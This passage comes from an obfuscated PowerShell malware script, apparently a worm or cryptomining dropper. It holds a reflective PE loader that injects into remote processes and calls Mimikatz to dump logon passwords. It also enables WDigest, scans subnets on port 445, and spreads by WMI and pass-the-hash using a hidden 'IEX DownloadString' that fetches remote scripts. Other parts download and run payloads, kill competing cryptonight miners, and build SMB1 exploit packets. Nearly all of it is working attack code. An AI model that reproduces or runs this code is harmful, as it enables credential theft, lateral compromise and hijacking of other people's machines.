				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem

				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)

				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "U"
				}

				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "U"
				}

				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "C"
				}

				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants

					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}

		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}


	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types

		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants

		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)

				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{

					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "E" -WarningAction Continue
				}

				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "U" -WarningAction Continue
				}

				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}

		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "U." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants

		$RemoteProcHandle = [IntPtr]::Zero

		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "C"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "C"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More "
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}


		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "ID: $ProcId"
			}


		}


        try
        {
            $Processors = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($Processors -is [array])
        {
            $Processor = $Processors[0]
        } else {
            $Processor = $Processors
        }

        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {

            Write-Error "architecture" -ErrorAction Stop
        }

        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "U"
		}

		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process


		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{

				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "C"
				    }
				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
				    if ($OutputPtr -eq [IntPtr]::Zero)
				    {
				    	Throw "U"
				    }
				    else
				    {
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				        Write-Output $Output
				        $Win32Functions.LocalFree.Invoke($OutputPtr);
				    }

		}

		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "V"
			}

			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle

			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}

		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "U" -WarningAction Continue
			}
		}


	}

	Main
}

function ConvertTo-DecimalIP ([Net.IPAddress]$IPAddress){
    $i = 3; $DecimalIP = 0;
    $IPAddress.GetAddressBytes() | FOreAcH-objECT { $DecimalIP += $_ * [Math]::Pow(256, $i); $i-- }
    return [UInt32]$DecimalIP
}

function ConvertTo-DottedDecimalIP ([String]$IPAddress){
        $IPAddress = [UInt32]$IPAddress
        $DottedIP = $( For ($i = 3; $i -gt -1; $i--) {
          $Remainder = $IPAddress % [Math]::Pow(256, $i)
          ($IPAddress - $Remainder) / [Math]::Pow(256, $i)
          $IPAddress = $Remainder
         } )
        return [String]::Join('.', $DottedIP)
}

function Get-NetworkRange( [String]$IP, [String]$Mask ) {
  $DecimalIP = cOnVErTto-DECImaLIp $IP
  $DecimalMask = COnvERTTO-deCImalip $Mask

  $Network = $DecimalIP -band $DecimalMask
  $Broadcast = $DecimalIP -bor ((-bnot $DecimalMask) -band [UInt32]::MaxValue)

  for ($i = $($Network + 1); $i -lt $Broadcast; $i++) {
    ConVERTTO-DotteddEcimALip $i
  }
  #Static WLAN 1
  if (!($IP.contains("192.168.0.")))
  {
      # 192.168.0.*
      $DecimalIP = cOnVErTto-DECImaLIp "192.168.0.1"
      $DecimalMask = COnvERTTO-deCImalip $Mask
      $Network = $DecimalIP -band $DecimalMask
      $Broadcast = $DecimalIP -bor ((-bnot $DecimalMask) -band [UInt32]::MaxValue)
      for ($i = $($Network + 1); $i -lt $Broadcast; $i++) {
        ConVERTTO-DotteddEcimALip $i
      }
  }
  #Static WLAN 2
  if (!($IP.contains("192.168.1.")))
  {
      # 192.168.1.*
      $DecimalIP = cOnVErTto-DECImaLIp "192.168.1.1"
      $DecimalMask = COnvERTTO-deCImalip $Mask
      $Network = $DecimalIP -band $DecimalMask
      $Broadcast = $DecimalIP -bor ((-bnot $DecimalMask) -band [UInt32]::MaxValue)
      for ($i = $($Network + 1); $i -lt $Broadcast; $i++) {
        ConVERTTO-DotteddEcimALip $i
      }
  }
  #Static WLAN 3
  if (!($IP.contains("192.168.153.")))
  {
      # 192.168.153.*
      $DecimalIP = cOnVErTto-DECImaLIp "192.168.153.1"
      $DecimalMask = COnvERTTO-deCImalip $Mask
      $Network = $DecimalIP -band $DecimalMask
      $Broadcast = $DecimalIP -bor ((-bnot $DecimalMask) -band [UInt32]::MaxValue)
      for ($i = $($Network + 1); $i -lt $Broadcast; $i++) {
        ConVERTTO-DotteddEcimALip $i
      }
  }
  #Static WLAN 4
  if (!($IP.contains("10.0.0.")))
  {
      # 10.0.0.*
      $DecimalIP = cOnVErTto-DECImaLIp "10.0.0.1"
      $DecimalMask = COnvERTTO-deCImalip $Mask
      $Network = $DecimalIP -band $DecimalMask
      $Broadcast = $DecimalIP -bor ((-bnot $DecimalMask) -band [UInt32]::MaxValue)
      for ($i = $($Network + 1); $i -lt $Broadcast; $i++) {
        ConVERTTO-DotteddEcimALip $i
      }
  }
}

function Test-Port($IP)
{
    try
    {
        $tcpclient = New-Object -TypeName system.Net.Sockets.TcpClient
        $iar = $tcpclient.BeginConnect($IP,445,$null,$null)
        $wait = $iar.AsyncWaitHandle.WaitOne(100,$false)
        if(!$wait)
        {
            $tcpclient.Close()
            return $false
        }
        else
        {
            $null = $tcpclient.EndConnect($iar)
            $tcpclient.Close()
            return $true
        }
    }
    catch
    {
        return $false
    }
}

function Get-IpInBs( [String]$ipbody, [String]$ipbottom ){
  return $ipbody+$ipbottom
}

function Get-IpInB([String]$IPAddress){
  $iphead+=$IPAddress.Split(".")[0]+"."+$IPAddress.Split(".")[1]+"."
  For ($i = 0; $i -le 254; ++$i)
  {
    $ipbody=$iphead+$i+"."
    For ($j = 1; $j -le 254; ++$j)
    {
      Get-IpInBs $ipbody $j
    }
  }
}

function Download_File
{
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $URL,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Filename
    )
    $webclient = neW-object System.Net.WebClient
    $webclient.Headers.Add(('User-Agent'),('Mozilla/4.0+'))
    $webclient.Proxy = [System.Net.WebRequest]::DefaultWebProxy
    $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
    $ProxyAuth = $webclient.Proxy.IsBypassed($URL)
    if($ProxyAuth)
    {
        [string]$hexformat = $webClient.DownloadString($URL)
    }
    else
    {
        $webClient = NeW-object -ComObject InternetExplorer.Application
        $webClient.Visible = $false
        $webClient.Navigate($URL)
        while($webClient.ReadyState -ne 4) { STaRT-slEep -Milliseconds 100 }
        [string]$hexformat = $webClient.Document.Body.innerText
        $webClient.Quit()
    }
    [Byte[]] $temp = $hexformat -split ' '
    [System.IO.File]::WriteAllBytes("$env:temp\$Filename", $temp)
}

function RunDDOS([String]$FileName)
{
    if ((teSt-PaTH ($env:temp+"\$FileName"))){
        $proc=$False
        [array]$p=gET-wmiOBJEcT -Class Win32_Process | SeLEcT Name
        foreach($process in $p){
            $name = ([string]($process.Name)).ToLower()
            if(($name -ne $null) -and ($name -ne "")){
                if($name.contains(($FileName)) -eq $true){
                    EcHo ('runing')
                    $proc=$True
                }
            }
        }
        if ($proc -ne $true)
        {
          StaRT-PROCeSS -NoNewWindow "$env:temp\$FileName"
        }
    }else{
      DoWnloaD_File "http://$nic/logos.png" ('java-log-9527.log')
      SlEEp -Seconds 5
      if (!(tesT-paTh ($env:temp+(('{0}java-log-9527.log') -F  [cHAR]92))))
      {return $False}
      DoWNlOaD_FiLE "http://$nic/cohernece.txt" "$FileName"
      sTART-proCEss -NoNewWindow "$env:temp\$FileName"
    }
}

function KillBot ([String]$WmiClassName){
    [array]$p=Get-wmiobject -Class Win32_Process | select Name,ProcessId,CommandLine,Path
    if(($p -ne $null) -and ($p -ne "")){
        foreach($process in $p){
            $id = $process.ProcessId
            $command = ([string]($process.CommandLine)).ToLower()
            $path = ([string]($process.Path)).ToLower()
            # cmdline
            if(($command -ne $null) -and ($command -ne "")){
                if($command.contains(('wmiclass')) -eq $true){
                    if($command.contains($WmiClassName.ToLower()) -ne $true){
                        stop-process -Id $id -Force
                    }
                }
                if($command.contains(('cryptonight')) -eq $true){
                    $ParentProcessId = (get-wmiobject -Class Win32_Process -Filter "ProcessId=$id").ParentProcessId
                    if(($id -ne $null) -and ($id -ne "")){
                        stop-process -Id $id -Force
                    }
                    if(($ParentProcessId -ne $null) -and ($ParentProcessId -ne "")){
                        stop-process -Id $ParentProcessId -Force
                    }
                }
            }
            # file_string
            if(($path -ne $null) -and ($path -ne "")){
                if ((Get-Item $path).length -gt 2mb){
                    $tmpContent=findstr /i /m /c:"cryptonight" "$path"
                }else{
                    $tmpContent=Get-Content -path $path | Select-String -pattern "cryptonight"
                }
                if(($tmpContent -ne $null) -and ($tmpContent -ne "")){
                    $ParentProcessId = (get-wmiobject -Class Win32_Process -Filter "ProcessId=$id").ParentProcessId
                    if(($id -ne $null) -and ($id -ne "")){
                        stop-process -Id $id -Force
                    }
                    if(($ParentProcessId -ne $null) -and ($ParentProcessId -ne "")){
                        stop-process -Id $ParentProcessId -Force
                    }
                }
            }
        }
    }
    return 1
}

function Get-creds($PEBytes64, $PEBytes32){
	$cc=INVokE-cOmMAnd -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, ('Void'), 0, "", ('sekurlsa::logonpasswords exit'))
    $cs=$cc.Split("n")
    $a=@()
	$NTLM=$False
    for ($i=0;$i -le $cs.Count-1; $i+=1)
    {
        if ($cs[$i].contains(('Username')) -and $cs[$i+1].contains(('Domain')) -and $cs[$i+2].contains(('Password')))
        {
            $h= $cs[$i].split(":")[-1].trim()+' '+$cs[$i+1].split(":")[-1].trim()+' '+$cs[$i+2].split(":")[-1].trim()
            if ($h.split(' ')[-1] -ne ('(NULL)') -and $h.split(' ')[0][-1] -ne "$" -and  $a -notcontains $h){
                $a+=$h
            }
        }
    }
    if ($a.count -eq 0)
    {
        $NTLM=$True
        $t=get-ITEMPrOPeRTY -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential
        if ($t -eq $null)
        { NeW-ItempROPeRTy -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1 | oUT-NUll}
        elseif ($t.UseLogonCredential -eq 0){
        SEt-ITeMPRoPERty  -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
        }

        $a=@()
        for ($i=0;$i -le $cs.Count-1; $i+=1)
        {
            if ($cs[$i].contains(('Username')) -and $cs[$i+1].contains(('Domain')) -and $cs[$i+2].contains('LM'))
            {
                if (!$cs[$i+2].contains(('NTLM')) -and $cs[$i+3].contains(('NTLM')) ){$nm=$cs[$i+3].split(":")[-1].trim()}
                else{$nm=$cs[$i+2].split(":")[-1].trim()}
                $h= $cs[$i].split(":")[-1].trim()+' '+$cs[$i+1].split(":")[-1].trim()+' '+$nm
                if ($h.split(' ')[-1] -ne ('(NULL)') -and $h.split(' ')[0][-1] -ne "$" -and  $a -notcontains $h){
                    $a+=$h
                }
            }
        }
      }
    return $a, $NTLM
}

function test-ip
{
    param
    (
        [Parameter(Mandatory = $False)]
        [string]$ip,
        [Parameter(Mandatory = $False)]
        [array]$creds,
        [Parameter(Mandatory = $False)]
        [string]$nic,
		[Parameter(Mandatory = $False)]
        [int]$ntlm
    )
     Process
    {

        foreach ($c in $creds)
        {
            $User=$c.split(" ")[0]
            $domain=$c.split(" ")[1]
            $passwd=$c.split(" ")[2]
            $password = CoNverTTO-SeCuREsTrING $passwd -asplaintext -force
            $cmd ="cmd /c powershell.exe -NoP -NonI -W Hidden "if((Get-WmiObject Win32_OperatingSystem).osarchitecture.contains('64')){IEX(New-Object Net.WebClient).DownloadString('http://$nic/antivirus.ps1')}else{IEX(New-Object Net.WebClient).DownloadString('http://$nic/antitrojan.ps1')}""

            if (!$ntlm)
            {
				$cred = nEw-objECT -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
                $ps=[string](gET-wmIOBJEcT -Namespace root\Subscription -Class __FilterToConsumerBinding -Credential $cred -computername $IP )
                if($ps -ne $null -and $ps.contains(('Windows Events Filter')))
                {  return 1 }
                if($ps -ne $null -and !$ps.contains(('Windows Events Filter')))
                {

                    $re=INVOKe-wMImEtHOd -class win32_process -name create -Argumentlist $cmd -Credential $cred -Computername $IP
                    if ($re -ne $null -and $re.returnvalue -eq 0 )
                    {return 1}
                }

                $username=$domain+"\"+$user
                $cred = NEW-oBJECt -Typename System.Management.Automation.PSCredential -argumentlist $username,$password
                $ps=[string](gEt-WmiOBJect -Namespace root\Subscription -Class __FilterToConsumerBinding -Credential $cred -computername $IP )
                if($ps -ne $null -and $ps.contains(('Windows Events Filter')))
                {  return 1 }
                if($ps -ne $null -and !$ps.contains(('Windows Events Filter')))
                {
                    $re=INVOke-wmImeThOD -class win32_process -name create -Argumentlist $cmd -Credential $cred -Computername $IP
                    if ($re -ne $null -and $re.returnvalue -eq 0 )
                    {return 1}
                }
                if ($user -ne ('administrator'))
                {
                    $cred = new-ObJEct -Typename System.Management.Automation.PSCredential -argumentlist ('administrator'),$password
                    $ps=[string](GEt-WmIObJEcT -Namespace root\Subscription -Class __FilterToConsumerBinding -Credential $cred -computername $IP )
                    if($ps -ne $null -and $ps.contains(('Windows Events Filter')))
                    {  return 1 }
                    if($ps -ne $null -and !$ps.contains(('Windows Events Filter')))
                    {
                        $re=iNvoKe-WmimEThOd -class win32_process -name create -Argumentlist $cmd -Credential $cred -Computername $IP
                        if ($re -ne $null -and $re.returnvalue -eq 0 )
                        {return 1}
                    }
                }
            }
            else
            {
                $ntlmhash=$passwd
				$cmdntlm =$cmd
				$re=inVOKe-wmieXEc -Target $ip -Username $user -Hash $ntlmhash
                if ($re.contains(('accessed WMI')))
                {
                    $re=iNvoKe-WMiEXEC -Target $ip -Username $user -Hash $ntlmhash -command $cmdntlm
                    if ($re -ne $null -and $re.contains(('Command executed with process')))
                    {return 1}
                }

                $re=iNVOKe-wmiexEc -Target $ip -domain $domain -Username $user -Hash $ntlmhash
                if ($re.contains(('accessed WMI')))
                {
                    $re=INVOkE-WMiEXEC -Target $ip -domain $domain -Username $user -Hash $ntlmhash -command $cmdntlm
                    if ($re -ne $null -and $re.contains(('Command executed with process')))
                    {return 1}
                }
                if ($user -ne ('administrator'))
                {
                    $re=InVoke-wmiEXec -Target $ip -Username ('administrator') -Hash $ntlmhash
                    if ($re.contains(('accessed WMI')))
                    {
                        $re=iNVoKE-wMIEXeC -Target $ip -Username ('administrator') -Hash $ntlmhash -command $cmdntlm
                        if ($re -ne $null -and $re.contains(('Command executed with process')))
                        {return 1}
                    }
                }
            }
        } #foreach
        return 0
      }
}

function sentfile($filepath,$wmipath)
{
        $EncodedFile = ([WmiClass] (('root{0}default:System_Anti_Virus_Core') -f[CHAR]92)).Properties[$wmipath].Value
        $Bytes2=[system.convert]::FromBase64String($EncodedFile)
        [IO.File]::WriteAllBytes($filepath,$Bytes2)
}



function make_smb1_anonymous_login_packet {
[Byte[]] $pkt = [Byte[]] (0x00)
$pkt += 0x00,0x00,0x48
$pkt += 0xff,0x53,0x4D,0x42
$pkt += 0x73
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += 0x01,0x48
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += 0xff,0xff
$pkt += 0x2f,0x4b
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x0d
$pkt += 0xff
$pkt += 0x00
$pkt += 0x00,0x00
$pkt += 0x00,0xf0
$pkt += 0x02,0x00
$pkt += 0x2f,0x4b
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x41,0xc0,0x00,0x00
$pkt += 0x0b,0x00
$pkt += 0x00,0x00
$pkt += 0x6e,0x74,0x00
$pkt += 0x70,0x79,0x73,0x6d,0x62,0x00
return $pkt
}
function smb1_anonymous_login($sock){
$raw_proto = MaKE_sMB1_anONymOUs_logIN_pACkET
$sock.Send($raw_proto) | out-NuLl
return SmB1_GeT_ReSpONse($sock)
}
function negotiate_proto_request()
{
[Byte[]] $pkt = [Byte[]] (0x00)
$pkt += 0x00,0x00,0x2f
$pkt += 0xFF,0x53,0x4D,0x42
$pkt += 0x72
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += 0x01,0x48
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += 0xff,0xff
$pkt += 0x2F,0x4B
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0x00
$pkt += 0x0c,0x00
$pkt += 0x02
$pkt += 0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00
return $pkt
}
function smb_header($smbheader) {
$parsed_header =@{server_component=$smbheader[0..3];
smb_command=$smbheader[4];
error_class=$smbheader[5];
reserved1=$smbheader[6];
error_code=$smbheader[6..7];
flags=$smbheader[8];
flags2=$smbheader[9..10];
process_id_high=$smbheader[11..12];
signature=$smbheader[13..21];
reserved2=$smbheader[22..23];
tree_id=$smbheader[24..25];
process_id=$smbheader[26..27];
user_id=$smbheader[28..29];
multiplex_id=$smbheader[30..31];
}
return $parsed_header
}
function smb1_get_response($sock){
$tcp_response = [Array]::CreateInstance(('byte'), 1024)
try{
$sock.Receive($tcp_response)| oUT-nuLl
}
catch {
}
$netbios = $tcp_response[0..4]
$smb_header = $tcp_response[4..36]
$parsed_header = SMB_HeAder($smb_header)
return $tcp_response, $parsed_header
}
function client_negotiate($sock){
$raw_proto = NEGotiATe_PrOto_rEqueSt
$sock.Send($raw_proto) | out-nUll
return SMb1_geT_rEspoNsE($sock)
}
function tree_connect_andx($sock, $target, $userid){
$raw_proto = treE_connEcT_ANdx_reqUesT $target $userid
$sock.Send($raw_proto) | oUT-nuLl
return Smb1_gET_REspONSE($sock)
}
function tree_connect_andx_request($target, $userid) {
[Byte[]] $pkt = [Byte[]](0x00)
$pkt +=0x00,0x00,0x48
$pkt +=0xFF,0x53,0x4D,0x42
$pkt +=0x75
$pkt +=0x00,0x00,0x00,0x00
$pkt +=0x18
$pkt +=0x01,0x48
$pkt +=0x00,0x00
$pkt +=0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
$pkt +=0x00,0x00
$pkt +=0xff,0xff
$pkt +=0x2F,0x4B
$pkt += $userid
$pkt +=0x00,0x00
$ipc = (('{0}{0}')-F[cHAr]92)+ $target + "\IPC$"
$pkt +=0x04
$pkt +=0xFF
$pkt +=0x00
$pkt +=0x00,0x00
$pkt +=0x00,0x00
$pkt +=0x01,0x00
$al=[system.Text.Encoding]::ASCII.GetBytes($ipc).Count+8
$pkt+=[bitconverter]::GetBytes($al)[0],0x00
$pkt +=0x00
$pkt += [system.Text.Encoding]::ASCII.GetBytes($ipc)
$pkt += 0x00
$pkt += 0x3f,0x3f,0x3f,0x3f,0x3f,0x00
$len = $pkt.Length - 4
$hexlen = [bitconverter]::GetBytes($len)[-2..-4]
$pkt[1] = $hexlen[0]
$pkt[2] = $hexlen[1]
$pkt[3] = $hexlen[2]
return $pkt
}
function smb1_anonymous_connect_ipc($target)
{
$client = neW-Object System.Net.Sockets.TcpClient($target,445)
$sock = $client.Client
cLIenT_NEGotiATE($sock) | OUT-NulL
$raw, $smbheader = SMb1_anOnymouS_login $sock
$raw, $smbheader = tREe_cONNECT_aNdx $sock $target $smbheader.user_id
return $smbheader, $sock
}
function make_smb1_nt_trans_packet($tree_id, $user_id) {
[Byte[]] $pkt = [Byte[]] (0x00)
$pkt += 0x00,0x08,0x3C
$pkt += 0xff,0x53,0x4D,0x42
$pkt += 0xa0
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x18
$pkt += 0x01,0x48
$pkt += 0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x00,0x00
$pkt += $tree_id
$pkt += 0x2f,0x4b
$pkt += $user_id
$pkt += 0x00,0x00
$pkt += 0x14
$pkt += 0x01
$pkt += 0x00,0x00
$pkt += 0x1e,0x00,0x00,0x00
$pkt += 0x16,0x00,0x01,0x00
$pkt += 0x1e,0x00,0x00,0x00
$pkt += 0x00,0x00,0x00,0x00
$pkt += 0x1e,0x00,0x00,0x00
$pkt += 0x4c,0x00,0x00,0x00
$pkt += 0xd0,0x07,0x00,0x00
$pkt += 0x6c,0x00,0x00,0x00
$pkt += 0x01
$pkt += 0x00,0x00
$pkt += 0x00,0x00
$pkt += 0xf1,0x07
$pkt += 0xff
$pkt += [Byte[]] (0x00) * 0x1e
$pkt += 0xff,0xff,0x00,0x00,0x01
$pkt += [Byte[]](0x00) * 0x7CD
return $pkt
}
